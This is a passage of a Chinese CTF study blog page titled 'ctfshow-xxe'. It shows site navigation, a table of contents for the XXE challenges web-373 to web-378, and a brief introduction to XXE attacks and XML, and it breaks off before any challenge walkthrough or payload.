@@ -1,0 +1,1152 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>ctfshow-xxe | MIXBP</title>
+  <meta name="keywords" content=" 学习笔记 , xxe ">
+  <meta name="description" content="ctfshow-xxe | MIXBP">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="BUUCTF2018-OnlineTool1首先启动靶机并访问，看到一串源码 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] &#x3D; $_SERVER[&#x27;HTTP_X_FOR">
+<meta property="og:type" content="article">
+<meta property="og:title" content="BUUCTF2018-OnlineTool1">
+<meta property="og:url" content="https://mixbp.github.io/master/2025/03/21/BUUCTF2018-OnlineTool1/index.html">
+<meta property="og:site_name" content="MIXBP">
+<meta property="og:description" content="BUUCTF2018-OnlineTool1首先启动靶机并访问，看到一串源码 123456789101112131415161718&lt;?phpif (isset($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;])) &#123;    $_SERVER[&#x27;REMOTE_ADDR&#x27;] &#x3D; $_SERVER[&#x27;HTTP_X_FOR">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+<meta property="og:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+<meta property="article:published_time" content="2025-03-21T11:50:32.000Z">
+<meta property="article:modified_time" content="2025-03-21T12:11:22.526Z">
+<meta property="article:author" content="MIXBP">
+<meta property="article:tag" content="刷题笔记">
+<meta property="article:tag" content="escapeshellarg()和escapeshellcmd()、单引号逃逸">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://mixbp.github.io/image/BUUCTF2018-OnlineTool1-1.png">
+
+
+<link rel="icon" href="/img/avatar.jpg">
+
+<link href="/css/style.css?v=1.1.0" rel="stylesheet">
+
+<link href="/css/hl_theme/atom-light.css?v=1.1.0" rel="stylesheet">
+
+<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">
+
+<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
+<script src="/js/titleTip.js?v=1.1.0" ></script>
+
+<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="/js/iconfont.js?v=1.1.0" ></script>
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="">
+  <input class="theme_blog_path" value="">
+  <input id="theme_shortcut" value="true" />
+  <input id="theme_highlight_on" value="true" />
+  <input id="theme_code_copy" value="true" />
+</div>
+
+
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/"
+   class="avatar_target">
+    <img class="avatar"
+         src="/img/avatar.jpg"/>
+</a>
+<div class="author">
+    <span>MIXBP</span>
+</div>
+
+<div class="icon">
+    
+        
+            <a title="github"
+               href="https://mixbp.github.io/"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-github"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="email"
+               href="mailto:2439254357@qq.com"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-email"></use>
+                    </svg>
+                
+            </a>
+        
+    
+        
+            <a title="qq"
+               href="http://wpa.qq.com/msgrd?v=3&uin=2439254357&site=qq&menu=yes"
+               target="_blank">
+                
+                    <svg class="iconfont-svg" aria-hidden="true">
+                        <use xlink:href="#icon-qq"></use>
+                    </svg>
+                
+            </a>
+        
+    
+</div>
+
+
+
+    <a class="more-menus">更多菜单</a>
+
+
+
+<ul>
+    <li>
+        <div class="all active" data-rel="All">All
+            
+                <small>(44)</small>
+            
+        </div>
+    </li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+        
+            
+            
+                <a class="dynamic-menu "
+                   target="_self"
+                   
+                   href="https://mixbp.github.io/">MIXBP</a>
+        
+            
+                <a class="dynamic-menu "
+                   target="_blank"
+                        
+                   href="https://mixbp.github.io/">github</a>
+        
+    </div>
+    <div>
+        
+            <a class="about  hasFriend  site_url"
+               
+               href="/about">About</a>
+        
+        <a style="width: 50%"
+                
+                                           class="friends">Friends</a>
+        
+    </div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="44">
+<input type="hidden" id="yelog_site_word_count" value="119.9k">
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        Links
+        <i class="iconfont icon-left"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://mixbp.github.io/">MIXBP</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <div class="right-top">
+        <div id="default-panel">
+            <i class="iconfont icon-search" data-title="search shortcut key i"></i>
+            <div class="right-title">All</div>
+            <i class="iconfont icon-file-tree" data-title="switch to outline view shortcut key w"></i>
+        </div>
+        <div id="search-panel">
+            <i class="iconfont icon-left" data-title="return"></i>
+            <input id="local-search-input" autocomplete="off"/>
+            <label class="border-line" for="input"></label>
+            <i class="iconfont icon-case-sensitive" data-title="case sensitive"></i>
+            <i class="iconfont icon-tag" data-title="label"></i>
+        </div>
+        <div id="outline-panel" style="display: none">
+            <div class="right-title">outline</div>
+            <i class="iconfont icon-list" data-title="switch to article list"></i>
+        </div>
+    </div>
+
+    <div class="tags-list">
+    <input id="tag-search" />
+    <div class="tag-wrapper">
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>报错注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>堆叠注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>命令执行</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>日志包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>刷题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件包含</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>文件上传</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>信息搜集</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>学习笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>正则表达式</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>做题笔记</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>escapeshellarg()和escapeshellcmd()、单引号逃逸</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>filter伪协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>HTML</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>http协议</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>linux find -name模糊查询文件</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>MySQL</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>payload构造</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php反序列化</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>PHP反序列化漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>php特性</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>python</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>sql注入</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>ssrf</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>waf绕过</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xss漏洞</a>
+            </li>
+        
+            <li class="article-tag-list-item">
+                <i class="iconfont icon-tag"></i><a>xxe</a>
+            </li>
+        
+    </div>
+
+</div>
+
+    
+    <div id="local-search-result">
+
+    </div>
+    
+    <nav id="title-list-nav">
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BUUCTF2018-OnlineTool1/"
+           data-tag="刷题笔记,escapeshellarg()和escapeshellcmd()、单引号逃逸"
+           data-author="" >
+            <span class="post-title" title="BUUCTF2018-OnlineTool1">BUUCTF2018-OnlineTool1</span>
+            <span class="post-date" title="2025-03-21 19:50:32">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/21/BJDCTF2020-ZJCTF%E4%B8%8D%E8%BF%87%E5%A6%82%E6%AD%A4/"
+           data-tag="刷题笔记,php特性"
+           data-author="" >
+            <span class="post-title" title="BJDCTF2020-ZJCTF不过如此">BJDCTF2020-ZJCTF不过如此</span>
+            <span class="post-date" title="2025-03-21 19:04:56">2025/03/21</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E6%9C%B1%E9%9B%80%E7%BB%84phpweb1/"
+           data-tag="刷题笔记,命令执行,php反序列化,linux find -name模糊查询文件"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020朱雀组phpweb1">网鼎杯2020朱雀组phpweb1</span>
+            <span class="post-date" title="2025-03-20 23:56:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/BSidesCF2020Hadabadday1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="BSidesCF2020Hadabadday1">BSidesCF2020Hadabadday1</span>
+            <span class="post-date" title="2025-03-20 23:55:26">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/20/%E7%BD%91%E9%BC%8E%E6%9D%AF2018Fakebook1/"
+           data-tag="刷题笔记,sql注入,php反序列化,ssrf"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2018Fakebook1">网鼎杯2018Fakebook1</span>
+            <span class="post-date" title="2025-03-20 23:53:35">2025/03/20</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ctfshow-ssrf">ctfshow-ssrf</span>
+            <span class="post-date" title="2025-03-19 20:05:14">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/19/ctfshow-xxe/"
+           data-tag="学习笔记,xxe"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xxe">ctfshow-xxe</span>
+            <span class="post-date" title="2025-03-19 13:32:30">2025/03/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/16/ssrf/"
+           data-tag="学习笔记,ssrf"
+           data-author="" >
+            <span class="post-title" title="ssrf">ssrf</span>
+            <span class="post-date" title="2025-03-16 21:44:06">2025/03/16</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/ctfshow-php%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,php反序列化"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php序列化">ctfshow-php序列化</span>
+            <span class="post-date" title="2025-03-14 22:11:16">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/14/GXYCTF2019-BabySQli1/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="GXYCTF2019-BabySQli1">GXYCTF2019-BabySQli1</span>
+            <span class="post-date" title="2025-03-14 20:44:55">2025/03/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/%E7%BD%91%E9%BC%8E%E6%9D%AF2020%E9%9D%92%E9%BE%99%E7%BB%84-AreUSerialz1/"
+           data-tag="刷题笔记,文件包含,php反序列化"
+           data-author="" >
+            <span class="post-title" title="网鼎杯2020青龙组-AreUSerialz1">网鼎杯2020青龙组-AreUSerialz1</span>
+            <span class="post-date" title="2025-03-13 23:36:35">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/13/ZJCTF2019-NiZhuanSiWei1/"
+           data-tag="刷题笔记,文件包含"
+           data-author="" >
+            <span class="post-title" title="ZJCTF2019-NiZhuanSiWei1">ZJCTF2019-NiZhuanSiWei1</span>
+            <span class="post-date" title="2025-03-13 20:39:05">2025/03/13</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/12/RoarCTF2019-EasyCalc1/"
+           data-tag="刷题笔记,命令执行,waf绕过"
+           data-author="" >
+            <span class="post-title" title="RoarCTF2019-EasyCalc1">RoarCTF2019-EasyCalc1</span>
+            <span class="post-date" title="2025-03-12 19:36:00">2025/03/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-HardSQL1/"
+           data-tag="刷题笔记,sql注入,报错注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019-HardSQL1">极客大挑战2019-HardSQL1</span>
+            <span class="post-date" title="2025-03-11 15:31:27">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019-%E9%9A%8F%E4%BE%BF%E6%B3%A81/"
+           data-tag="刷题笔记,sql注入,堆叠注入"
+           data-author="" >
+            <span class="post-title" title="强网杯2019-随便注1">强网杯2019-随便注1</span>
+            <span class="post-date" title="2025-03-11 00:07:32">2025/03/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/08/ctfshow-sqli-labs/"
+           data-tag="sql注入,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-sqli-labs">ctfshow-sqli-labs</span>
+            <span class="post-date" title="2025-03-08 17:51:18">2025/03/08</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/04/ctfshow-sql%E6%B3%A8%E5%85%A5/"
+           data-tag="sql注入,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-sql注入">ctfshow-sql注入</span>
+            <span class="post-date" title="2025-03-04 23:42:23">2025/03/04</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/03/02/php%E7%89%B9%E6%80%A7/"
+           data-tag="php特性,学习笔记"
+           data-author="" >
+            <span class="post-title" title="php特性">php特性</span>
+            <span class="post-date" title="2025-03-02 20:14:41">2025/03/02</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/24/ctfshow-php%E7%89%B9%E6%80%A7/"
+           data-tag="php特性,学习笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-php特性">ctfshow-php特性</span>
+            <span class="post-date" title="2025-02-24 18:53:16">2025/02/24</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-xss/"
+           data-tag="学习笔记,xss"
+           data-author="" >
+            <span class="post-title" title="ctfshow-xss">ctfshow-xss</span>
+            <span class="post-date" title="2025-02-23 17:12:49">2025/02/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/23/ctfshow-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/"
+           data-tag="学习笔记,信息搜集"
+           data-author="" >
+            <span class="post-title" title="ctfshow-信息搜集">ctfshow-信息搜集</span>
+            <span class="post-date" title="2025-02-23 15:24:36">2025/02/23</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/17/ctfshow-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="ctfshow-命令执行">ctfshow-命令执行</span>
+            <span class="post-date" title="2025-02-17 00:00:48">2025/02/17</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/14/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"
+           data-tag="学习笔记,PHP反序列化漏洞"
+           data-author="" >
+            <span class="post-title" title="PHP反序列化">PHP反序列化</span>
+            <span class="post-date" title="2025-02-14 00:51:53">2025/02/14</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/12/xss%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="学习笔记,xss漏洞"
+           data-author="" >
+            <span class="post-title" title="xss漏洞总结">xss漏洞总结</span>
+            <span class="post-date" title="2025-02-12 03:30:15">2025/02/12</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/11/xss-labs/"
+           data-tag="学习笔记,xss漏洞"
+           data-author="" >
+            <span class="post-title" title="xss-labs">xss-labs</span>
+            <span class="post-date" title="2025-02-11 23:43:19">2025/02/11</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/02/01/linux%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4/"
+           data-tag="学习笔记,linux"
+           data-author="" >
+            <span class="post-title" title="linux基础命令">linux基础命令</span>
+            <span class="post-date" title="2025-02-01 22:14:44">2025/02/01</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"
+           data-tag="学习笔记,命令执行"
+           data-author="" >
+            <span class="post-title" title="命令执行">命令执行</span>
+            <span class="post-date" title="2025-01-29 22:54:38">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/ctfshow-web82/"
+           data-tag="文件包含,做题笔记"
+           data-author="" >
+            <span class="post-title" title="ctfshow-web82">ctfshow-web82</span>
+            <span class="post-date" title="2025-01-29 04:36:22">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/29/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
+           data-tag="文件包含,学习笔记"
+           data-author="" >
+            <span class="post-title" title="文件包含漏洞总结">文件包含漏洞总结</span>
+            <span class="post-date" title="2025-01-29 02:22:55">2025/01/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/ctfshow-web160/"
+           data-tag="做题笔记,文件上传,日志包含"
+           data-author="" >
+            <span class="post-title" title="[ctfshow]web160">[ctfshow]web160</span>
+            <span class="post-date" title="2025-01-26 16:37:35">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/26/buuctf%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98upload/"
+           data-tag="做题笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="buuctf极客大挑战upload">buuctf极客大挑战upload</span>
+            <span class="post-date" title="2025-01-26 16:36:39">2025/01/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/22/upload/"
+           data-tag="学习笔记,文件上传"
+           data-author="" >
+            <span class="post-title" title="upload">upload</span>
+            <span class="post-date" title="2025-01-22 15:22:47">2025/01/22</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/19/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,python"
+           data-author="" >
+            <span class="post-title" title="python学习笔记">python学习笔记</span>
+            <span class="post-date" title="2025-01-19 01:39:35">2025/01/19</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Http/"
+           data-tag="刷题笔记,http协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Http">极客大挑战2019Http</span>
+            <span class="post-date" title="2025-01-09 16:47:44">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/09/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019SecretFile/"
+           data-tag="刷题笔记,filter伪协议"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019SecretFile">极客大挑战2019SecretFile</span>
+            <span class="post-date" title="2025-01-09 01:36:08">2025/01/09</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019LoveSQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019LoveSQL">极客大挑战2019LoveSQL</span>
+            <span class="post-date" title="2025-01-05 20:00:42">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019Havefun/"
+           data-tag="刷题笔记,payload构造"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019Havefun">极客大挑战2019Havefun</span>
+            <span class="post-date" title="2025-01-05 19:35:48">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/05/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019EasySQL/"
+           data-tag="刷题笔记,sql注入"
+           data-author="" >
+            <span class="post-title" title="极客大挑战2019EasySQL">极客大挑战2019EasySQL</span>
+            <span class="post-date" title="2025-01-05 19:10:32">2025/01/05</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2025/01/03/sql%E6%B3%A8%E5%85%A5/"
+           data-tag="sql注入,学习笔记"
+           data-author="" >
+            <span class="post-title" title="sql注入">sql注入</span>
+            <span class="post-date" title="2025-01-03 21:14:16">2025/01/03</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/29/MySQL/"
+           data-tag="学习笔记,MySQL"
+           data-author="" >
+            <span class="post-title" title="MySQL">MySQL</span>
+            <span class="post-date" title="2024-12-29 19:30:51">2024/12/29</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/28/php%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,正则表达式"
+           data-author="" >
+            <span class="post-title" title="正则表达式笔记">正则表达式笔记</span>
+            <span class="post-date" title="2024-12-28 20:46:55">2024/12/28</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/26/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,php"
+           data-author="" >
+            <span class="post-title" title="PHP学习笔记">PHP学习笔记</span>
+            <span class="post-date" title="2024-12-26 23:50:15">2024/12/26</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/HTML%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"
+           data-tag="学习笔记,HTML"
+           data-author="" >
+            <span class="post-title" title="HTML学习笔记">HTML学习笔记</span>
+            <span class="post-date" title="2024-12-25 23:54:00">2024/12/25</span>
+        </a>
+        
+        
+        <a  class="All "
+           href="/2024/12/25/welcome/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="welcome">welcome</span>
+            <span class="post-date" title="2024-12-25 20:38:33">2024/12/25</span>
+        </a>
+        
+        <div id="no-item-tips">
+
+        </div>
+    </nav>
+    <div id="outline-list">
+    </div>
+</div>
+
+    </div>
+    <div class="hide-list">
+        <div class="semicircle" data-title="Toggle full screen shortcut key s">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div id="post">
+    <div class="pjax">
+        <article id="post-ctfshow-xxe" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">ctfshow-xxe</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+        <span class="tag">
+            <i class="iconfont icon-tag"></i>
+            
+            <a class="color5">学习笔记</a>
+            
+            <a class="color4">xxe</a>
+            
+        </span>
+        
+    </div>
+    <div class="article-meta">
+        
+            Created At : <time class="date" title='Updated At: 2025-03-19 20:03:07'>2025-03-19 13:32</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        <span>Count:3k</span>
+        
+        
+        <span id="busuanzi_container_page_pv">
+            Views 👀 :<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+        <span class="top-comment" title="Jump to comment area">
+            <a href="#comments">
+                Comment:<span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </a>
+        </span>
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ctfshow-xxe"><span class="toc-text">ctfshow-xxe</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">XXE基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-373%EF%BC%88%E6%9C%89%E5%9B%9E%E6%98%BEXXE%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-text">web-373（有回显XXE读取文件数据）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-374%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BEXXE%E5%A4%96%E5%B8%A6%E6%95%B0%E6%8D%AE%EF%BC%89"><span class="toc-text">web-374（无回显XXE外带数据）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-375%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BEXXE%E8%BF%87%E6%BB%A4XML%E5%A3%B0%E6%98%8E%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-375（无回显XXE过滤XML声明绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-376%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BEXXE%E8%BF%87%E6%BB%A4XML%E5%A3%B0%E6%98%8E%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-376（无回显XXE过滤XML声明绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-377%EF%BC%88%E6%97%A0%E5%9B%9E%E6%98%BEXXE%E8%BF%87%E6%BB%A4http%E5%92%8CXML%E5%A3%B0%E6%98%8Eutf-16%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87%EF%BC%89"><span class="toc-text">web-377（无回显XXE过滤http和XML声明utf-16编码绕过）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#web-378%EF%BC%88%E6%9C%89%E5%9B%9E%E6%98%BEXXE%EF%BC%89"><span class="toc-text">web-378（有回显XXE）</span></a></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="ctfshow-xxe"><a href="#ctfshow-xxe" class="headerlink" title="ctfshow-xxe"></a>ctfshow-xxe</h1><h2 id="XXE基础知识"><a href="#XXE基础知识" class="headerlink" title="XXE基础知识"></a>XXE基础知识</h2><p>​        XXE（XML External Entity）攻击是一种针对XML处理漏洞的网络安全攻击手段。攻击者利用应用程序在解析XML输入时的漏洞，构造恶意的XML数据，进而实现各种恶意目的。</p>
+<p>所以要学习xxe就需要了解xml</p>
+<p>xml相关：<br>XML，全称为可扩展标记语言（Extensible Markup Language），是一种用于标记电子文件使其具有结构性的标记语言。它属于标准通用标记语言的子集，通过此种标记，计算机之间可以处理包含各种信息的数据，比如文章等。XML非常适合万维网传输，提供统一的方法来描述和交换独立于应用程序或供应商的结构化数据。它是Internet环境中跨平台的、依赖于内容的技术，也是当今处理分布式结构信息的有效工具。</p>
+<p><strong>XML的特性和语法包括：</strong></p>
